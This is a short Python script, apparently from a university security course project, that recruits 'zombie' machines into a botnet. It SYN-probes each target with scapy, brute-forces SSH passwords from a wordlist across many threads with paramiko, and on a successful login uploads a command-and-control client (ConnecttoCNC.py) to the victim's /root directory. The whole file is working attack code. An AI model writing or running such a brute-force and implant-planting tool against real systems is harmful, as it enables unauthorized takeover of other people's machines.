from scapy.all import *
import paramiko
import threading

paramiko.util.log_to_file("connections.log")

zombievms = raw_input("Enter the number of Zombie VM's")

clientslist = list()
threadpool = list()
connectresults = list()
successclients = list()
def tryandconnect(ipaddresses,passwordsource,successfullyconnectedclients):
	try:
		client = paramiko.SSHClient()
		client.load_system_host_keys()
		client.connect(ipaddresses,password=passwordsource)
		sftp = client.open_sftp()
		sftp.put('/root/CS445-Project/ConnecttoCNC.py','/root/ConnecttoCNC.py')
		successfullyconnectedclients.append(client)
	except(paramiko.ssh_exception.AuthenticationException,paramiko.ssh_exception.SSHException) as e:
		return None



for index in range(int(zombievms)):
	ipaddresses = raw_input("Enter the ip address of zombie VM {}: ".format(index + 1))

	#Send SYN scan to zombie VM
	answer= sr1(IP(dst=ipaddresses)/TCP(dport=80,flags="S"))
	print(answer.display())

	#ADD CHECK FOR IF RESPONSE IS RECEIEVED


	#SSH into machine
	#client = paramiko.SSHClient()
	#client.load_system_host_keys()
	with open("Passwords.txt",'r') as file:
		content = file.readlines()
		listofpasswords = [index.strip() for index in content]
		for row in listofpasswords:
			t = threading.Thread(target=tryandconnect, args = (ipaddresses,row,successclients))
			threadpool.append(t)
			t.start()

		print('List size = ', len(threadpool))
		for threadresult in threadpool:
			threadresult.join()

		#for successclientsiterator in successclients:
			#stdin,stdout,stderr = successclientsiterator.exec_command('')
			#print(stdout.readlines())
				#client.connect(ipaddresses,password=row)
				#clientslist.append(client)
				#stdin,stdout,stderr = client.exec_command('ls -l')
				#print(stdout.readlines())


